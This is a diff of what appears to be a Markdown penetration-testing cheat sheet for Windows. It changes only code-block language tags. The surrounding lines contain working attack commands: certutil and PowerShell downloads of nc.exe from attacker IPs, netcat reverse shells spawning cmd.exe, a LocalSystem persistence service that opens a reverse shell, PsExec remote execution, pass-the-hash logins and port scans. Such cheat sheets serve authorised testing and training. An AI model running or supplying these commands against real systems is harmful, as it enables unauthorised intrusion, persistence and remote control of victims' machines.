@@ -507,7 +507,7 @@ ftp -s:ftp-commands.txt
 
 #### CertUtil
 
-```text
+```csharp
 certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
 ```
 
@@ -525,7 +525,7 @@ python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.ex
 
 #### HTTP: Powershell
 
-```text
+```csharp
 powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
 powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
@@ -615,20 +615,20 @@ for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
 
 ### Converting Python to Windows Executable \(.py -&gt; .exe\)
 
-```bash
+```csharp
 python pyinstaller.py --onefile convert-to-exe.py
 ```
 
 ### Port Scanning with NetCat
 
-```bash
+```csharp
 nc -nvv -w 1 -z host 1000-2000
 nc -nv -u -z -w 1 host 160-162
 ```
 
 ### Exploiting Vulnerable Windows Services: Weak Service Permissions
 
-```text
+```csharp
 # Look for SERVICE_ALL_ACCESS in the output
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 
@@ -639,7 +639,7 @@ sc start [service_name]
 
 ### Creating Persistence
 
-```text
+```csharp
 sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
 ```
 
@@ -716,13 +716,13 @@ runas /user:userName cmd.exe
 
 #### PsExec
 
-```bash
+```csharp
 psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
 ```
 
 #### Pth-WinExe
 
-```bash
+```csharp
 pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
 ```
 
